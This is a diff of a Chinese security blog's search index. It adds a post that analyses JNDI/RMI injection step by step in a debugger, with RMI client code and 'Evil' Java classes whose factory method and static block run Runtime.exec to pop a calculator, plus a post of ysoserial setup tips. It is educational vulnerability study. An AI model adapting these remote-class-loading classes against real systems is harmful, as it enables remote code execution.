+<h2 id="客户端代码实现"><a href="#客户端代码实现" class="headerlink" title="客户端代码实现"></a>客户端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mport javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Log4j_client &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        //System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">        // 这里先注释掉，这里是高版本jdk的防范机制，对url默认不信任，然后无法复现成功</span><br><span class="line">        InitialContext initialContext=new InitialContext();</span><br><span class="line">        // 创建一个JNDI InitialContext实例，用于访问JNDI服务</span><br><span class="line">        initialContext.lookup(&quot;rmi://127.0.0.1:12345/remote&quot;);</span><br><span class="line">        // 尝试连接远程主机</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111158954.png"
+                      class="" title="image-20250311111158954"
+                > 
+
+<h2 id="恶意类Evil"><a href="#恶意类Evil" class="headerlink" title="恶意类Evil"></a>恶意类Evil</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111254962.png"
+                      class="" title="image-20250311111254962"
+                > 
+
+<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>启动服务端和客户端</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111345871.png"
+                      class="" title="image-20250311111345871"
+                > 
+
+<p><em>报错The object factory is untrusted. Set the system property ‘com.sun.jndi.rmi.object.trustURLCodebase’ to ‘true’</em> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111457239.png"
+                      class="" title="image-20250311111457239"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250314171332324.png"
+                      class="" title="image-20250314171332324"
+                > 
+
+<p>我们需要进入getObjectInstance，所以我们需要进入else，就是if的条件一个都不能满足，低版本的jdk里面没有这个限制可以不用设置。高版本有这个设置。所以测试的时候不采用绕过手段我们就需要全局设置trustURLCodebase参数设置为true<strong>这里我们初步学习不采用绕过方式，所以需要设置trustURLCodebase为true</strong> </p>
+<p>所以可以先在代码层面配置一下</p>
+<p>把客户端注释删掉</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111521783.png"
+                      class="" title="image-20250311111521783"
+                > 
+
+<p> 再次运行</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111556400.png"
+                      class="" title="image-20250311111556400"
+                >
+
+<p>实现命令执行</p>
+<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>端点打在客户端的<strong>initialContext.lookup(“rmi:&#x2F;&#x2F;127.0.0.1:12345&#x2F;remote”);</strong> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112142514.png"
+                      class="" title="image-20250311112142514"
+                > 
+
+<p>跟进initialContext.lookup</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112322450.png"
+                      class="" title="image-20250311112322450"
+                >
+
+<p>这里通过提取协议，提取出来了rmi，然后判断协议是否为空，如果不为空说明是我们的url是一个ip地址  </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112621799.png"
+                      class="" title="image-20250311112621799"
+                >
+
+<p>回到上面的lookup跟进</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113252823.png"
+                      class="" title="image-20250311113252823"
+                >
+
+<p>ResolveResult var2 &#x3D; this.getRootURLContext(var1, this.myEnv);</p>
+<p>这个函数将我们的url给提取成了ip，port，以及注册表的绑定的名字remote</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113439043.png"
+                      class="" title="image-20250311113439043"
+                >
+
+<p>var3也是，知识获取了对象并且设置对象的类型为context</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113517988.png"
+                      class="" title="image-20250311113517988"
+                >
+
+<p>跟进这里的lookup，漏洞触发的地方</p>
+<p>先看var2.getRemainingName() 会返回的是什么参数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113727742.png"
+                      class="" title="image-20250311113727742"
+                >
+
+<p>就只是返回remote，我们注册表的名字</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113816366.png"
+                      class="" title="image-20250311113816366"
+                >
+
+<p>判断我们传入的注册表的名字是否为空，我们的是remote不为空，所以往下走</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113905487.png"
+                      class="" title="image-20250311113905487"
+                > 
+
+<p>这里传入的也是remote</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113938872.png"
+                      class="" title="image-20250311113938872"
+                > 
+
+<p>这里我们可以看到有个readobject了，可以看看var4是怎么获取的也是一种思路<strong>我们这里是采用加载远程恶意类对象</strong> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114259827.png"
+                      class="" title="image-20250311114259827"
+                > 
+
+<p>可以看到我们的var20即将被返回的值是我们的远程恶意类对象</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114349568.png"
+                      class="" title="image-20250311114349568"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114558379.png"
+                      class="" title="image-20250311114558379"
+                > 
+
+<p>然后将我们的恶意类对象给实例化</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114639838.png"
+                      class="" title="image-20250311114639838"
+                > 
+
+<p>跟进函数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114944263.png"
+                      class="" title="image-20250311114944263"
+                > 发现builder为null，所以不会进入这个if
+
+<p>将恶意类名称赋值给了ref</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311115057408.png"
+                      class="" title="image-20250311115057408"
+                > 
+
+<p>获取对象的实例</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120004969.png"
+                      class="" title="image-20250311120004969"
+                >
+
+<p>获取实例的时候会调用我们写的无参构造方法，所以就执行了我们的恶意代码。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120021055.png"
+                      class="" title="image-20250311120021055"
+                > 
+
+<h2 id="恶意类的无参构造初始化"><a href="#恶意类的无参构造初始化" class="headerlink" title="恶意类的无参构造初始化"></a>恶意类的无参构造初始化</h2><p>根据上面链子发现factory.getObjectInstance函数会调用我们的类的无参实例化方法</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="类的静态方法"><a href="#类的静态方法" class="headerlink" title="类的静态方法"></a>类的静态方法</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil_static &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311125258505.png"
+                      class="" title="image-20250311125258505"
+                >
+
+<p>成功造成命令执行</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>这里的漏洞触发点有一些不同</p>
+<p>javax&#x2F;naming&#x2F;spi&#x2F;NamingManager.java</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130215787.png"
+                      class="" title="image-20250311130215787"
+                > 
+
+<p>这里有个if判断，codebase为null所以不会进去</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130605217.png"
+                      class="" title="image-20250311130605217"
+                > 
+
+<p>最后会走到对我们恶意类的实例化</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130335797.png"
+                      class="" title="image-20250311130335797"
+                >
+
+<p>然后实例化调用了静态方法造成RCE</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130639541.png"
+                      class="" title="image-20250311130639541"
+                > 
+
+]]></content>
+      <categories>
+        <category>漏洞原理分析</category>
+      </categories>
+      <tags>
+        <tag>JNDI</tag>
       </tags>
   </entry>
   <entry>
@@ -2594,6 +2594,66 @@
       <categories>
         <category>漏洞原理分析</category>
       </categories>
+  </entry>
+  <entry>
+    <title>ysoserial测试环境搭建tips</title>
+    <url>/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/</url>
+    <content><![CDATA[<p>ysoserial是一个反序列化漏洞学习项目。项目搭建过程中遇到了一些问题，在这替大家避雷一下</p>
+<ul>
+<li>idea</li>
+<li>JDK 1.8_441</li>
+</ul>
+<h2 id="java-错误-不支持发行版本-6"><a href="#java-错误-不支持发行版本-6" class="headerlink" title="java: 错误: 不支持发行版本 6"></a>java: 错误: 不支持发行版本 6</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326104844879.png"
+                      class="" title="image-20250326104844879"
+                > 
+
+<p>这里的问题是jdk配置的问题</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326104944823.png"
+                      class="" title="image-20250326104944823"
+                > 
+
+<p>模块部分修改</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326105010718.png"
+                      class="" title="image-20250326105010718"
+                > 
+
+
+
+<h2 id="java-编译失败-内部-java-编译器错误"><a href="#java-编译失败-内部-java-编译器错误" class="headerlink" title="java: 编译失败: 内部 java 编译器错误"></a>java: 编译失败: 内部 java 编译器错误</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326105029614.png"
+                      class="" title="image-20250326105029614"
+                > 
+
+<p>这个是java字节码版本设置问题</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326105114734.png"
+                      class="" title="image-20250326105114734"
+                > 
+
+<p>就可以正常编译运行了</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326105138910.png"
+                      class="" title="image-20250326105138910"
+                > 
+]]></content>
+      <tags>
+        <tag>ysoserial</tag>
+      </tags>
   </entry>
   <entry>
     <title>泛微ReceiveTodoRequestByXml_SQL注入漏洞</title>
